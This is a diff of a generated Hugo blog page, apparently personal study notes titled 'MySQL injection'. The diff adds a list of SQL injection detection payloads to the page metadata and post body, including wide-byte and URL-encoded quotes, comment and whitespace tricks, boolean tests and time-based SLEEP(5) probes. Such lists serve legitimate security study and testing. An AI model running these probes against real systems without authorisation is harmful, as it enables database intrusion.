@@ -9,14 +9,14 @@ https://github.com/alex-shpak/hugo-book
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content=" 检测payload
-&#39; &#34; ` &#39;) &#34;) ; -- # AND 1=1 AND 1=2 &#39; AND &#39;1&#39;=&#39;1 &#39; AND &#39;1&#39;=&#39;2 &#34; AND &#34;1&#34;=&#34;1 &#34; AND &#34;1&#34;=&#34;2 &#39;) AND (&#39;1&#39;=&#39;1 &#39; AND SLEEP(5)--&#43; &#34; AND SLEEP(5)--&#43; AND (SELECT * FROM (SELECT(SLEEP(5)))a)">
+&#39; &#34; ` %df&#39; %27 %2527 ) )) &#39;) &#34;) ; -- /* # 1&#43;1 1-0 1/0 1e308 @@version /**/ %0a %09 -- AND 1=1 AND 1=2 &#39; AND &#39;1&#39;=&#39;1 &#39; AND &#39;1&#39;=&#39;2 &#34; AND &#34;1&#34;=&#34;1 &#34; AND &#34;1&#34;=&#34;2 &#39;) AND (&#39;1&#39;=&#39;1 &#39; AND SLEEP(5)--&#43; &#34; AND SLEEP(5)--&#43; AND (SELECT * FROM (SELECT(SLEEP(5)))a)">
 <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
 <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
 <meta name="color-scheme" content="light dark"><meta property="og:url" content="https://Fivesix567.github.io/posts/2026/01/MySQL-injection/">
   <meta property="og:site_name" content="Fivesix&#39;s blog">
   <meta property="og:title" content="MySQL injection">
   <meta property="og:description" content="检测payload
-&#39; &#34; ` &#39;) &#34;) ; -- # AND 1=1 AND 1=2 &#39; AND &#39;1&#39;=&#39;1 &#39; AND &#39;1&#39;=&#39;2 &#34; AND &#34;1&#34;=&#34;1 &#34; AND &#34;1&#34;=&#34;2 &#39;) AND (&#39;1&#39;=&#39;1 &#39; AND SLEEP(5)--&#43; &#34; AND SLEEP(5)--&#43; AND (SELECT * FROM (SELECT(SLEEP(5)))a)">
+&#39; &#34; ` %df&#39; %27 %2527 ) )) &#39;) &#34;) ; -- /* # 1&#43;1 1-0 1/0 1e308 @@version /**/ %0a %09 -- AND 1=1 AND 1=2 &#39; AND &#39;1&#39;=&#39;1 &#39; AND &#39;1&#39;=&#39;2 &#34; AND &#34;1&#34;=&#34;1 &#34; AND &#34;1&#34;=&#34;2 &#39;) AND (&#39;1&#39;=&#39;1 &#39; AND SLEEP(5)--&#43; &#34; AND SLEEP(5)--&#43; AND (SELECT * FROM (SELECT(SLEEP(5)))a)">
   <meta property="og:locale" content="zh_CN">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -26,10 +26,10 @@ https://github.com/alex-shpak/hugo-book
 
   <meta itemprop="name" content="MySQL injection">
   <meta itemprop="description" content="检测payload
-&#39; &#34; ` &#39;) &#34;) ; -- # AND 1=1 AND 1=2 &#39; AND &#39;1&#39;=&#39;1 &#39; AND &#39;1&#39;=&#39;2 &#34; AND &#34;1&#34;=&#34;1 &#34; AND &#34;1&#34;=&#34;2 &#39;) AND (&#39;1&#39;=&#39;1 &#39; AND SLEEP(5)--&#43; &#34; AND SLEEP(5)--&#43; AND (SELECT * FROM (SELECT(SLEEP(5)))a)">
+&#39; &#34; ` %df&#39; %27 %2527 ) )) &#39;) &#34;) ; -- /* # 1&#43;1 1-0 1/0 1e308 @@version /**/ %0a %09 -- AND 1=1 AND 1=2 &#39; AND &#39;1&#39;=&#39;1 &#39; AND &#39;1&#39;=&#39;2 &#34; AND &#34;1&#34;=&#34;1 &#34; AND &#34;1&#34;=&#34;2 &#39;) AND (&#39;1&#39;=&#39;1 &#39; AND SLEEP(5)--&#43; &#34; AND SLEEP(5)--&#43; AND (SELECT * FROM (SELECT(SLEEP(5)))a)">
   <meta itemprop="datePublished" content="2026-01-29T20:30:38+08:00">
   <meta itemprop="dateModified" content="2026-01-29T20:30:38+08:00">
-  <meta itemprop="wordCount" content="47">
+  <meta itemprop="wordCount" content="62">
 
 <title>MySQL injection | Fivesix&#39;s blog</title>
 <link rel="icon" href="/favicon.png" >
@@ -39,7 +39,7 @@ https://github.com/alex-shpak/hugo-book
 
 
   <script defer src="/fuse.min.js"></script>
-  <script defer src="/zh.search.min.8a372902eee07c4f1cac9a6fe247d9885bca9f3446f8f93bb603b4a5b0bb11b7.js" integrity="sha256-ijcpAu7gfE8crJpv4kfZiFvKnzRG&#43;Pk7tgO0pbC7Ebc=" crossorigin="anonymous"></script>
+  <script defer src="/zh.search.min.e5d2da7fa4d7e3968b60e6f44ed261adaa000569d85a327b754de9553bb1e780.js" integrity="sha256-5dLaf6TX45aLYOb0TtJhraoABWnYWjJ7dU3pVTux54A=" crossorigin="anonymous"></script>
 
 
 
@@ -366,11 +366,26 @@ https://github.com/alex-shpak/hugo-book
 <pre tabindex="0"><code>&#39;
 &#34;
 `
+%df&#39;
+%27
+%2527
+)
+))
 &#39;)
 &#34;)
 ;
---
+-- 
+/*
 #
+1+1
+1-0
+1/0
+1e308
+@@version
+/**/
+%0a
+%09
+--
 AND 1=1
 AND 1=2
 &#39; AND &#39;1&#39;=&#39;1
